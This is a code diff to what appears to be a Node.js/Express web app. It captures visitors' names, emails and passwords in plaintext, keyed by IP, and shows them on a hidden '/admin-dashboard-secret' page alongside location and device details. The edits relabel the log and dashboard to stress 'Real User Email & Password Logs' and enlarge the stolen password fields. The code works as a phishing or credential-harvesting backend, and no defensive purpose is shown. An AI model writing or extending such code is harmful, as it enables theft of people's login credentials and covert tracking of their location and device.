@@ -75,7 +75,7 @@ app.post('/api/set-credentials', (req, res) => {
     if (name && email && password) {
         visitorCredentials[ip] = { name, email, password };
     }
-    logVisitor(req, `Logged In (Email: ${email})`);
+    logVisitor(req, `Logged In with Real Email: ${email}`);
     res.json({ success: true, ip: ip });
 });
 
@@ -288,7 +288,7 @@ app.get('/admin-dashboard-secret', (req, res) => {
                     <div class="section-title" style="color:#ff0055;">📩 Messages from Users</div>
                     <div id="messagesContainer"></div>
 
-                    <div class="section-title" style="color:#00f0ff;">⚡ Live User Activity & Credentials</div>
+                    <div class="section-title" style="color:#00f0ff;">⚡ Real User Email & Password Logs</div>
                     <div id="visitorCardsContainer"></div>
                 </div>
             </div>
@@ -380,8 +380,8 @@ app.get('/admin-dashboard-secret', (req, res) => {
                                         <div class="visitor-card">
                                             <div class="time-stamp">\${log.time}</div>
                                             <div class="name-tag">👤 Name: \${log.name}</div>
-                                            <div style="font-size:13px; color:#00ffcc; margin-bottom:2px;">📧 Email: \${log.email}</div>
-                                            <div style="font-size:13px; color:#ff0055; margin-bottom:4px;">🔑 Password: \${log.password}</div>
+                                            <div style="font-size:14px; color:#00ffcc; margin-bottom:3px; font-weight:bold;">📧 Email: \${log.email}</div>
+                                            <div style="font-size:14px; color:#ff0055; margin-bottom:5px; font-weight:bold;">🔑 Password: \${log.password}</div>
                                             <div class="ip-tag">IP: \${log.ip}</div>
                                             <div class="info-row">📍 <span>Location:</span> \${log.location}</div>
                                             <div class="info-row">📱 <span>Device:</span> \${log.device}</div>
